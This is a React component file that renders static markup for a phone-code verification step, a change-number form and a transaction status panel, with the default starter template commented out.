import React, { Component } from 'react';
/*import logo from './logo.svg';*/
/*import './App.css';*/
//import './css/app_status.css';
//import './js/all_status.js';

class App extends Component {
  render() {
    return (
      <center>
      {/* STEP2 */}
      <div className="content" style={{display:'block'}}>
        <div className="status_bar" style={{display:'block'}}>

        </div>
        <div className="quest">
          <font>Enter the code</font>
          <font id="requestId">Request ID #######</font>
        </div><br /><br />
        <div className="stat">We will call you now on <font className="phoneNumber">############</font> Please listen for the 4-digit code</div>
        <div className="input">
          <input id="authSMSCode" type="text" maxLength="4" placeholder="Enter code" /><button id="checkSMSCode">Next</button>
          <font id="errorSMSCode" style={{color: 'red'}}></font>
        </div>
        <div className="links">

        </div>
      </div>
      {/* STEP2 Phone */}
      <div className="content" style={{display:'none'}}>
        <div className="status_bar">

        </div>
        <div className="quest">
          <font>Change number</font>
          <font id="requestId">Request ID #######</font>
        </div><br /><br />
        <div className="stat">Your phone number <font className="phoneNumber">############</font><br />Insert a new number in the field</div>
        <div className="input">
          <input type="text" placeholder="You phone" /><button id="inputNewPhone">Change</button>
        </div>
      </div>
      {/* STEP3 / STEP4 */}
      <div className="content" style={{display:'none'}}>
        <div className="status_bar">

        </div>
        <div className="quest">
          <font>Transaction status</font>
          <font id="requestId">Request ID #######</font>
        </div><br /><br />
        <div className="stat">
          <ul>
            <li>Status:</li>
            <li>Date and time:</li>
            <li>Pay amount:</li>
          </ul>
          <ul>
            <li id="status">&nbsp;</li>
            <li id="date">&nbsp;</li>
            <li id="cash">&nbsp;</li>
          </ul>
          <p id="details">&nbsp;</p>
        </div>
        <div className="details">
          <p></p>
        </div>
        <div className="input">
          <button id="link" className="step3" style={{display:'none'}}>Start verification</button>
        </div>
      </div>
      </center>
    );
   /*
   return (
      <div className="App">
        <header className="App-header">
          <img src={logo} className="App-logo" alt="logo" />
          <p>
            Edit <code>src/App.js</code> and save to reload.
          </p>
          <a
            className="App-link"
            href="https://reactjs.org"
            target="_blank"
            rel="noopener noreferrer"
          >
            Learn React
          </a>
        </header>
      </div>
    );
    */
  }
}

export default App;
